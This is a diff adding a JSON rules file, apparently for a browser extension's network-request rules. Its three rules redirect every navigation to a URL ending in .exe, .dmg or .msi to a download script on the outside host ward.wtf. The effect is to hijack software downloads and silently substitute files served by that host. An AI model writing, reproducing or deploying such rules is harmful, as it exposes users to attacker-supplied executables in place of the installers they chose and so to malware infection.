@@ -1,0 +1,44 @@
+[
+  {
+    "id": 1,
+    "priority": 1,
+    "action": {
+      "type": "redirect",
+      "redirect": {
+        "url": "https://ward.wtf/download.php?type=exe"
+      }
+    },
+    "condition": {
+      "urlFilter": "*.exe",
+      "resourceTypes": ["main_frame", "sub_frame"]
+    }
+  },
+  {
+    "id": 2,
+    "priority": 1,
+    "action": {
+      "type": "redirect",
+      "redirect": {
+        "url": "https://ward.wtf/download.php?type=dmg"
+      }
+    },
+    "condition": {
+      "urlFilter": "*.dmg",
+      "resourceTypes": ["main_frame", "sub_frame"]
+    }
+  },
+  {
+    "id": 3,
+    "priority": 1,
+    "action": {
+      "type": "redirect",
+      "redirect": {
+        "url": "https://ward.wtf/download.php?type=msi"
+      }
+    },
+    "condition": {
+      "urlFilter": "*.msi",
+      "resourceTypes": ["main_frame", "sub_frame"]
+    }
+  }
+]
